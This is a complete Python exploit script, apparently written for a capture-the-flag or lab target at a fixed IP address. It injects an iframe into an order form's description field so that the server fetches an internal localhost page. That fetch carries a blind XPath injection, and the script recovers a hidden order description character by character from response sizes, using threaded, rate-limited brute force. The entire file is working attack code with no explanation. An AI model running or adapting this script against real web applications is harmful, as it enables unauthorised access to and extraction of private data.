#!/usr/bin/env python3
import requests, string, time, threading, queue
from requests.adapters import HTTPAdapter
from urllib.parse import quote_plus

# Configuration
URL = "http://94.237.121.49:33950/order.php"
PROXY = {"http":"http://192.168.50.169:8081"}
HEADERS = {"Content-Type":"application/x-www-form-urlencoded"}

session = requests.Session()
session.proxies.update(PROXY)
session.headers.update(HEADERS)

CHARSET = string.ascii_letters + string.digits + string.punctuation + " "
MAX_LENGTH = 200
DELAY = 0.01
SUCCESS_BYTES = 68000

# Rate limiting configuration
RATE = 5                     # requests per second
_WORKERS = 3                 # number of worker threads sending requests concurrently

class RateLimiter:
    """Thread-safe simple rate limiter that spaces requests so total ~= RATE."""
    def __init__(self, rate):
        self.interval = 1.0 / rate
        self.lock = threading.Lock()
        self.next_time = time.monotonic()

    def wait(self):
        with self.lock:
            now = time.monotonic()
            if now < self.next_time:
                to_sleep = self.next_time - now
                time.sleep(to_sleep)
                self.next_time += self.interval
            else:
                # we're late or exactly on time: schedule next slot
                self.next_time = now + self.interval

rate_limiter = RateLimiter(RATE)

def send_request(payload, position):
    """Send the POST request and return True if successful"""
    encoded = quote_plus(payload)
    iframe = f'<iframe src="http://localhost:8000/index.php?q=123 or substring(/orders/order[7]/description,{position},1)=\'{encoded}\'" width="500" height="820"></iframe>'

    try:
        response = session.post(URL, data={'desc': iframe}, timeout=2)
    except Exception:
        return False

    return len(response.content) >= SUCCESS_BYTES

def exfiltrate():
    found = ""
    for pos in range(1, MAX_LENGTH + 1):
        # Build a queue of candidate chars for this position
        q = queue.Queue()
        for ch in CHARSET:
            q.put(ch)

        matched = None
        stop_event = threading.Event()

        # worker that pops chars and sends requests, using global rate limiter
        def worker():
            nonlocal matched
            while not stop_event.is_set():
                try:
                    ch = q.get_nowait()
                except queue.Empty:
                    break
                # Wait for our global token/slot
                rate_limiter.wait()
                ok = send_request(ch, pos)
                q.task_done()
                if ok:
                    matched = ch
                    stop_event.set()
                    # no need to empty queue here; other workers will stop when they see stop_event
                    break

        # start threads
        threads = []
        for _ in range(min(_WORKERS, q.qsize())):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            threads.append(t)

        # wait for workers to finish (either all chars tried or matched)
        for t in threads:
            t.join()

        if matched:
            found += matched
            print(f"Found character at position {pos}: {matched} -> {found}")
        else:
            print("No more characters found, stopping.")
            break

    print("Final:", found)

if __name__ == "__main__":
    exfiltrate()
